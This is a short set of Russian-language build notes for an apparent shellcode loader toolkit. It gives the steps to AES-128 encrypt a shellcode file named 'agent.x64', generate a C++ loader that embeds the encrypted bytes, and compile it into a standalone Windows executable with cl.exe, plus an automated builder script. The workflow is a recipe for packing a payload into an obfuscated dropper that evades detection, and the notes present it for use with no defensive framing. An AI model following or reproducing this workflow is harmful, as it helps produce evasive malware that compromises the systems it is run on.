

cd C:\TEMP\CppObfuscator\shell_loader\

`Шифруем shellcode:
python shell_loader/shellcode_encryptor.py


папке sample/ должны быть созданы:  agent.x64.aes — зашифрованный shellcode (AES-128, padded)  и aes_key.bin  — 16-байтный бинарный AES-ключ


`Генерируем загрузчик:
python shell_loader/loader_generator.py

Прочитает .aes и .bin . Вставит байты в .cpp и Создаст: output/agent_loader.cpp


`автономный EXE-файл -  ручная сборка 
cl /nologo /Ox /EHsc output/agent_loader.cpp advapi32.lib /link /OUT:agent_loader.exe


================================
`авто режим
python shell_loader/builder.py


================================
`загрузчик для исходника 
raw_loader.cpp


